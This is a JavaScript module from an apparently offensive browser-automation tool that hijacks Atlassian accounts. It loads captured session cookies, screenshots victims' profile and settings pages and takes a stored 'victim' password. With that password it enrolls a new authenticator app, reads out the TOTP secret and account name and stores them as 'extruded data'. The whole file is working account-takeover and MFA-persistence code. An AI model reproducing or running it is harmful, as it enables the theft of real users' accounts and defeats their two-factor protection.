'use strict';

const db = require('../../db/db');
const necrohelp = require('../helpers/necrohelp');
const clusterLib = require('../../puppeteer/cluster');
const necrolib = require('./necrolib');

function config() {
    return clusterLib.GetConfig() || {};
}

async function setup(page, taskId, cookies, params) {
    necrolib.PropagateCookies(cookies);
    await necrohelp.SetCookieJar(page, cookies);
    await necrohelp.ConfigureUserAgent(page, params?.userAgent, taskId);
}

function screenshotPath(taskId, label) {
    const safeTask = String(taskId).replace(/[^a-z0-9._-]/gi, '_');
    const safeLabel = String(label).replace(/[^a-z0-9._-]/gi, '_');
    return necrohelp.getOutputPath(config(), `atlassian_${safeTask}_${safeLabel}.jpg`);
}

async function run(taskId, action) {
    return necrohelp.runTask(db, taskId, action);
}

exports.GetProfileInfo = async ({ page, data: [taskId, cookies, params] }) => run(taskId, async () => {
    const urls = necrohelp.requireArray(params?.urls, 'params.urls');
    await setup(page, taskId, cookies, params);
    await necrohelp.timedGoto(page, urls[0]);
    await necrohelp.Sleep(5000);
    await page.screenshot({ fullPage: true, path: screenshotPath(taskId, 'initial') });
    await page.click('a:nth-child(1) > button:nth-child(1)');
    await necrohelp.Sleep(5000);
    await page.screenshot({ fullPage: true, path: screenshotPath(taskId, 'profile') });
});

exports.GetAccountSettingsScreenshots = async ({ page, data: [taskId, cookies, params] }) => run(taskId, async () => {
    const urls = necrohelp.requireArray(params?.urls, 'params.urls');
    await setup(page, taskId, cookies, params);
    const failures = [];
    for (const [index, url] of urls.entries()) {
        try {
            await necrohelp.timedGoto(page, url);
            await page.screenshot({ fullPage: true, path: screenshotPath(taskId, `settings_${index}`) });
        } catch (error) {
            failures.push({ url, error: error.message });
        }
    }
    if (failures.length === urls.length) throw new Error(`All Atlassian settings pages failed: ${failures.map(item => item.error).join('; ')}`);
    return failures.length ? { status: 'partial', failures } : { status: 'completed' };
});

exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) => run(taskId, async () => {
    const urls = necrohelp.requireArray(params?.urls, 'params.urls');
    const credentials = await db.GetCredentials(`victim:${params.trackers}`);
    const password = credentials?.find(entry => entry.key === 'Password')?.val;
    if (!password) throw new Error('Atlassian password credential is missing');

    await setup(page, taskId, cookies, params);
    await necrohelp.timedGoto(page, urls[0]);
    await necrohelp.Sleep(5000);
    await page.click('input');
    await page.type('input', password, { delay: 300 });
    await page.keyboard.press('Enter');
    await necrohelp.Sleep(5000);
    await page.click('button[id="mfa.enrollment.getapp.submit"]');
    await necrohelp.Sleep(5000);
    await page.click('div[id="mfa.enrollment.configureapp.totpsecret"] > div > button');
    await necrohelp.Sleep(5000);

    const accountName = await page.$eval('input[id="mfa.enrollment.configureapp.email"]', ({ value }) => value);
    const secretKey = await page.$eval('input[id="mfa.enrollment.configureapp.secret"]', ({ value }) => value);
    const otp = await necrohelp.Totp(secretKey);
    await page.click('input[name="otpCode"]');
    await page.type('input[name="otpCode"]', otp, { delay: 300 });
    await necrohelp.Sleep(2000);
    await page.click('button[id="mfa.enrollment.connectphone.submit"]');
    await necrohelp.Sleep(5000);
    await page.screenshot({ fullPage: true, path: screenshotPath(taskId, '2fa') });
    await db.AddExtrudedData(taskId, 'account_name', Buffer.from(accountName).toString('base64'));
    await db.AddExtrudedData(taskId, 'totp_secret', Buffer.from(secretKey).toString('base64'));
});
